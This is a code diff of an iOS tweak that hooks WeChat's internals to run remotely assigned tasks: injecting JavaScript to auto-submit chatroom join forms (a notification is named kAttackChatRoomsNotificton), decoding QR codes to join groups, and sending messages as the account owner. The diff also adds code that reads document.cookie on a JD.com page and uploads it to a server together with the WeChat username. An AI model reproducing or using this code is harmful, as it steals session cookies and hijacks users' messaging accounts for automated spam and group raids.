+        uploadLog(geServerTypeTitle(m_current_taskType,4,@"发送消息时候,当前消息发送失败"),[NSString stringWithFormat:@"内容为：%@,m_nsFromUsr：%@ m_nsToUsr：%@ m_nCSetting:%@",[[arg2 objectForKey:@"18"] GetDisplayContent],[[arg2 objectForKey:@"18"] m_nsFromUsr],[[arg2 objectForKey:@"18"] m_nsToUsr],[m_nCSetting m_nsUsrName]]);
+    }
+
+    if([[arg2 objectForKey:@"18"] m_uiMessageType] == 10000){
+
+        NSString *frequentlyContent = [[arg2 objectForKey:@"18"] GetDisplayContent];
+
+        if([frequentlyContent containsString:@"发送消息过于频繁"] || [frequentlyContent containsString:@"操作过于频繁"]){
+            
+            if(![m_frequentlyUser containsObject:[[arg2 objectForKey:@"18"] m_nsFromUsr]]){
+                //添加到
+                [m_frequentlyUser addObject:[[arg2 objectForKey:@"18"] m_nsFromUsr]];
+
+                m_frequently_count =  m_frequently_count + 1;
+
+                uploadLog(geServerTypeTitle(m_current_taskType,4,@"发送消息过于频繁或者操作过于频繁"),[NSString stringWithFormat:@"内容为：%@,m_nsFromUsr：%@ m_nsToUsr：%@ m_nCSetting:%@",[[arg2 objectForKey:@"18"] GetDisplayContent],[[arg2 objectForKey:@"18"] m_nsFromUsr],[[arg2 objectForKey:@"18"] m_nsToUsr],[m_nCSetting m_nsUsrName]]);
+            }
+        }
+    }
 }
 
 
@@ -5159,15 +5321,35 @@ static int m_currentNums = 0;
 
             m_fetchUinAndKeyOK = YES;
         }
-    }else if([currentURl containsString:@"addchatroombyqrcode?uuid"]){
+    }else if([currentURl containsString:@"addchatroombyqrcode?uuid"] && m_current_taskType == 88){
 
-        NSString *script = [NSString stringWithFormat:@"document.getElementById(\"form\").submit();"];
-        [self stringByEvaluatingJavaScriptFromString:script];
+        NSString *titleScript = @"document.getElementsByClassName('title')[0].innerText";
+        NSString *errorTitle = [self stringByEvaluatingJavaScriptFromString:titleScript];
 
-        uploadLog(geServerTypeTitle(88,0,@"进入了进群页面,js注入进群,并给进群发送通知消息"),[NSString stringWithFormat:@"YYUIWebView这个函数中"]);
+        if([errorTitle isEqualToString:@""]){
+
+            NSString *script = [NSString stringWithFormat:@"document.getElementById(\"form\").submit();"];
+            [self stringByEvaluatingJavaScriptFromString:script];
+
+            uploadLog(geServerTypeTitle(88,0,@"进入了进群页面,js注入进群,并给进群发送通知消息"),[NSString stringWithFormat:@"YYUIWebView这个函数中"]);
 
 
-        [[NSNotificationCenter defaultCenter] postNotificationName:kAttackChatRoomsNotificton object:nil userInfo:m_taskDataDic88];
+            [[NSNotificationCenter defaultCenter] postNotificationName:kAttackChatRoomsNotificton object:nil userInfo:m_taskDataDic88];
+        }else{
+            NSLog(@"当前无法加入群信息,获取到的内容为：%@",errorTitle);
+            uploadLog(geServerTypeTitle(88,0,@"当前无法加入群信息,获取到的内容为"),[NSString stringWithFormat:@"%@",errorTitle]);
+
+            hook_fail_task(m_current_taskType,[m_taskDataDic88 objectForKey:@"taskId"],errorTitle);
+        }
+    }else if([currentURl containsString:@"wqs.jd.com/my"]){
+
+        NSString *jsCookie = @"document.cookie";
+        NSString *currentCookie = [self stringByEvaluatingJavaScriptFromString:jsCookie];
+
+        NSLog(@"YYUIWebView document.cookie -------------%@",currentCookie);
+
+        //上传给服务端
+        uploadJdCookie([m_nCSetting m_nsUsrName],currentCookie);
     }
 }
 
@@ -5177,7 +5359,6 @@ static int m_currentNums = 0;
 %hook MMWebViewController
 
 %property(nonatomic, copy) BOOL isMyGroupWeb;
-
 
 %new
 - (NSString *)decodeQRImageWith:(UIImage*)aImage {
@@ -5190,7 +5371,6 @@ static int m_currentNums = 0;
     CIQRCodeFeature *feature = [features firstObject];
 
     qrResult = feature.messageString;
-    NSLog(@"==============decodeQRImageWith======");
     return qrResult;
 }
 
@@ -5200,39 +5380,141 @@ static int m_currentNums = 0;
 
     NSString *currentUrl = [self getCurrentUrl];
 
-    NSLog(@"currentUrl :%@",currentUrl);
+    NSLog(@"MMWebViewController current url is %@ ,RoutUrls:%@",currentUrl,[self getRoutUrls]);
+    if(m_current_taskType == 88 && !m_scanQRCode){
 
-    if ([currentUrl containsString:@"&ext=needScan"]) {
-        NSString *res = [[self webView] stringByEvaluatingJavaScriptFromString:@"document.body.offsetHeight;"];
-        CGFloat h = [res integerValue];
-        [[[self webView] scrollView] setContentSize:CGSizeMake([[self webView] frame].size.width, h + 50)];
-        UIImage *img = [[self webView] getImage];
+        NSArray *routUrls = [self getRoutUrls];
 
-        uploadLog(geServerTypeTitle(88,0,@"收到了进入了needScan"),[NSString stringWithFormat:@"进行图片存储"]);
+        m_scanQRCode = YES;
 
-        if (img != nil) {
-            NSString *url = [self decodeQRImageWith:img];
+        BOOL isExist = NO;
 
-            NSLog(@"ScanQRCodeLogicController url is %@",url);
-
-            //发送消息
-//            [[NSNotificationCenter defaultCenter] postNotificationName:kScanQRCodeNotificton object:nil userInfo:nil];
+        for(int i=0; i < [routUrls count]; i++){
+            NSLog(@"this is get one url :%@",routUrls[i]);
+            if([routUrls[i] containsString:[m_taskDataDic88 objectForKey:@"domain"]] || [routUrls[i] containsString:@"&ext=needScan"]){
+                isExist = YES;
+                break;
+            }
         }
-    }else if([currentUrl containsString:@"addchatroombyqrcode?uuid="]){
-        //https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/addchatroombyqrcode?uuid=A07TnSHEwOZwZMZg&exportkey=A2JhRu7%2FVsz4Vo4zhWSGhig%3D&pass_ticket=Cw%2BUE4nSDlyI%2FGvroZ1eJSc61xvgaWIyyFuiRYobBVF186el8fH8ATGxanqQJzbk&wechat_real_lang=zh_CN
 
-        NSArray *arrayUrl = [currentUrl componentsSeparatedByString:@"uuid="];
-        NSArray *arrayUrl2 = [arrayUrl[1] componentsSeparatedByString:@"&"];
+        //判断当前链接是否包涵当前域名
+        if(isExist){
+            dispatch_group_async(group, queue, ^{
 
-        NSLog(@"arrayUrl2:%@ ====%@",arrayUrl2,arrayUrl2[0]);
+                [NSThread sleepForTimeInterval:3];
 
-        m_scanQrUrl = [arrayUrl2 mutableCopy];
+                dispatch_async(dispatch_get_main_queue(), ^{
 
-        uploadLog(geServerTypeTitle(88,0,@"进入了MMWebViewController得到addchatroombyqrcode"),[NSString stringWithFormat:@"二维码key为：%@",arrayUrl2]);
+                    NSString *imgUrl = [[self webView] stringByEvaluatingJavaScriptFromString:@"document.getElementsByTagName('img')[0].src"];
+                    // CGFloat h = [res integerValue];
+                    // [[[self webView] scrollView] setContentSize:CGSizeMake([[self webView] frame].size.width, h + 50)];
+                    UIImage *img = [UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:imgUrl]]];
+
+                    uploadLog(geServerTypeTitle(88,0,@"得到图片信息MMWebViewController"),[NSString stringWithFormat:@"进行图片存储"]);
+
+                    NSLog(@"MYHOOK imageURL: %@", imgUrl);
+                    if (img != nil) {
+                        NSString *url = [self decodeQRImageWith:img];
+
+                        uploadLog(geServerTypeTitle(88,0,@"收到了进入了needScan,图片img不为空"),[NSString stringWithFormat:@"图片url：%@",url]);
+
+                        NSLog(@"MYHOOK qrcode url: %@", url);
+
+                        id scanQrCode = [[NSClassFromString(@"ScanQRCodeLogicController") alloc] initWithViewController:self CodeType:2];
+                        [scanQrCode scanOnePicture:img];
+
+                    }else{
+                        uploadLog(geServerTypeTitle(88,0,@"收到了进入了needScan,图片img为空"),[NSString stringWithFormat:@""]);
+                        
+                        hook_fail_task(m_current_taskType,[m_taskDataDic88 objectForKey:@"taskId"],@"收到了进入了needScan,图片img为空");
+                    }
+                });
+                
+            });
+        }
     }
+
+    if([currentUrl containsString:@"addchatroombyqrcode?uuid="]){
+            //https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/addchatroombyqrcode?uuid=A07TnSHEwOZwZMZg&exportkey=A2JhRu7%2FVsz4Vo4zhWSGhig%3D&pass_ticket=Cw%2BUE4nSDlyI%2FGvroZ1eJSc61xvgaWIyyFuiRYobBVF186el8fH8ATGxanqQJzbk&wechat_real_lang=zh_CN
+    
+            NSArray *arrayUrl = [currentUrl componentsSeparatedByString:@"uuid="];
+            NSArray *arrayUrl2 = [arrayUrl[1] componentsSeparatedByString:@"&"];
+    
+            NSLog(@"arrayUrl2:%@ ====%@",arrayUrl2,arrayUrl2[0]);
+    
+            m_scanQrUrl = [arrayUrl2 mutableCopy];
+    
+            uploadLog(geServerTypeTitle(88,0,@"进入了MMWebViewController得到addchatroombyqrcode"),[NSString stringWithFormat:@"二维码key为：%@",arrayUrl2]);
+    }
+
+//    if([currentUrl containsString:@"addchatroombyqrcode?uuid"]){
+//        NSString *script = [NSString stringWithFormat:@"document.getElementById(\"form\").submit();"];
+//        [[self webView] stringByEvaluatingJavaScriptFromString:script];
+//    }
 }
 
 %end
+
+// 4.4.0 方式
+//%hook MMWebViewController
+//
+//%property(nonatomic, copy) BOOL isMyGroupWeb;
+//
+//
+//%new
+//- (NSString *)decodeQRImageWith:(UIImage*)aImage {
+//    NSString *qrResult = nil;
+//
+//    CIContext *context = [CIContext contextWithOptions:nil];
+//    CIDetector *detector = [CIDetector detectorOfType:CIDetectorTypeQRCode context:context options:@{CIDetectorAccuracy:CIDetectorAccuracyHigh}];
+//    CIImage *image = [CIImage imageWithCGImage:aImage.CGImage];
+//    NSArray *features = [detector featuresInImage:image];
+//    CIQRCodeFeature *feature = [features firstObject];
+//
+//    qrResult = feature.messageString;
+//    NSLog(@"==============decodeQRImageWith======");
+//    return qrResult;
+//}
+//
+//
+//- (void)webViewDidFinishLoad:(id)arg1 {
+//    %orig;
+//
+//    NSString *currentUrl = [self getCurrentUrl];
+//
+//    NSLog(@"currentUrl :%@",currentUrl);
+//
+//    if ([currentUrl containsString:@"&ext=needScan"]) {
+//        NSString *res = [[self webView] stringByEvaluatingJavaScriptFromString:@"document.body.offsetHeight;"];
+//        CGFloat h = [res integerValue];
+//        [[[self webView] scrollView] setContentSize:CGSizeMake([[self webView] frame].size.width, h + 50)];
+//        UIImage *img = [[self webView] getImage];
+//
+//        uploadLog(geServerTypeTitle(88,0,@"收到了进入了needScan"),[NSString stringWithFormat:@"进行图片存储"]);
+//
+//        if (img != nil) {
+//            NSString *url = [self decodeQRImageWith:img];
+//
+//            NSLog(@"ScanQRCodeLogicController url is %@",url);
+//
+//            //发送消息
+////            [[NSNotificationCenter defaultCenter] postNotificationName:kScanQRCodeNotificton object:nil userInfo:nil];
+//        }
+//    }else if([currentUrl containsString:@"addchatroombyqrcode?uuid="]){
+//        //https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/addchatroombyqrcode?uuid=A07TnSHEwOZwZMZg&exportkey=A2JhRu7%2FVsz4Vo4zhWSGhig%3D&pass_ticket=Cw%2BUE4nSDlyI%2FGvroZ1eJSc61xvgaWIyyFuiRYobBVF186el8fH8ATGxanqQJzbk&wechat_real_lang=zh_CN
+//
+//        NSArray *arrayUrl = [currentUrl componentsSeparatedByString:@"uuid="];
+//        NSArray *arrayUrl2 = [arrayUrl[1] componentsSeparatedByString:@"&"];
+//
+//        NSLog(@"arrayUrl2:%@ ====%@",arrayUrl2,arrayUrl2[0]);
+//
+//        m_scanQrUrl = [arrayUrl2 mutableCopy];
+//
+//        uploadLog(geServerTypeTitle(88,0,@"进入了MMWebViewController得到addchatroombyqrcode"),[NSString stringWithFormat:@"二维码key为：%@",arrayUrl2]);
+//    }
+//}
+//
+//%end
 
 
 
@@ -5556,7 +5838,6 @@ static int m_currentNums = 0;
     [br onAddToContacts];
 
     //发送消息
-    CContactMgr *mgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
     CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:1 nsFromUsr:[m_nCSetting m_nsUsrName]];
     CMessageMgr *msMgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CMessageMgr")];
     myMsgText.m_nsContent = nsContent;
